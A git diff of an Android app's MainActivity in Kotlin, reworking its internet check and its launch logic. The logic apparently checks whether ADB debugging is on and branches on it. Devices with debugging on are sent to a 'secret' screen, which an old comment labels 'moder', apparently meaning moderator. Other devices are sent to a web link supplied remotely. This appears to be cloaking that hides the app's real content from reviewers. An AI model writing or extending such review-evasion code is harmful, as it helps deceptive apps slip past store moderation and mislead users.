@@ -5,6 +5,8 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.os.Build
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
@@ -64,7 +66,6 @@ class MainActivity : AppCompatActivity() {
         } else {
             addListenners()
         }
-
     }
 
     private fun startDevServiceAndRegisterReciever(a: Int, b: Int, constants: Constants){
@@ -92,50 +93,26 @@ class MainActivity : AppCompatActivity() {
 
         lifecycleScope.launch {
 
-            App.customDDbTransmitter.collect{
-                //check adb
-                if (it == "1" && link.startsWith("htt")){
-                    //we have link
-                    intentToTheW.putExtra(Constants.KEY_LINK, link)
-                    startActivity(intentToTheW)
+            if (isInternetAvailable(this@MainActivity)){
+                App.customDDbTransmitter.collect{
+                    //check adb
+                    if (it == "0" && link.startsWith("htt")){
+                        //we have link
+                        intentToTheW.putExtra(Constants.KEY_LINK, link)
+                        startActivity(intentToTheW)
 
-                } else if(it == "1" && link == Constants.EMPTY){
-                    //build link and go to the web
-                    addMoreListenners()
-                    superChecker.getData()
+                    } else if(it == "0" && link == Constants.EMPTY){
+                        //build link and go to the web
+                        addMoreListenners()
+                        superChecker.getData()
 
-                } else if(it == "0"){
-                    //moder 1
-                    goToTheSecretActivity()
+                    } else if(it == "1"){
+                        goToTheSecretActivity()
+                    }
                 }
+            } else {
+                startActivity(intentToNoInet)
             }
-
-//
-//            val inet = checkInet()
-//
-//
-//            if (inet){
-//                App.customDDbTransmitter.collect{
-//                    //check adb
-//                    if (it == "1" && link.startsWith("htt")){
-//                        //we have link
-//                        intentToTheW.putExtra(Constants.KEY_LINK, link)
-//                        startActivity(intentToTheW)
-//
-//                    } else if(it == "1" && link == Constants.EMPTY){
-//                        //build link and go to the web
-//                        addMoreListenners()
-//                        superChecker.getData()
-//
-//                    } else if(it == "0"){
-//                        //moder 1
-//                        goToTheSecretActivity()
-//                    }
-//                }
-//            } else {
-//                //go to the no inet Activity
-//                startActivity(intentToNoInet)
-//            }
         }
     }
 
@@ -146,7 +123,6 @@ class MainActivity : AppCompatActivity() {
         lifecycleScope.launch {
             App.customLinkFlow.collect{
                 if (it.startsWith("htt")){
-                    Log.d("123123", "The link is $it")
                     intentToTheW.putExtra(Constants.KEY_LINK, it)
                     startActivity(intentToTheW)
                 }
@@ -164,19 +140,16 @@ class MainActivity : AppCompatActivity() {
         //off
     }
 
-    private suspend fun checkInet(): Boolean {
-        return withContext(Dispatchers.IO){
-            try {
-                val connection = URL("http://clients3.google.com/generate_204").openConnection() as HttpURLConnection
-                connection.setRequestProperty("User-Agent", "Android")
-                connection.setRequestProperty("Connection", "close")
-                connection.connectTimeout = 500
-                connection.connect()
-                (connection.responseCode == 204 && connection.contentLength == 0)
-            } catch (ex: IOException){
+    fun isInternetAvailable(context: Context): Boolean {
+        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
 
-                false
-            }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val network = connectivityManager.activeNetwork ?: return false
+            val networkCapabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
+            return networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) || networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
+        } else {
+            val networkInfo = connectivityManager.activeNetworkInfo ?: return false
+            return networkInfo.isConnected
         }
     }
 
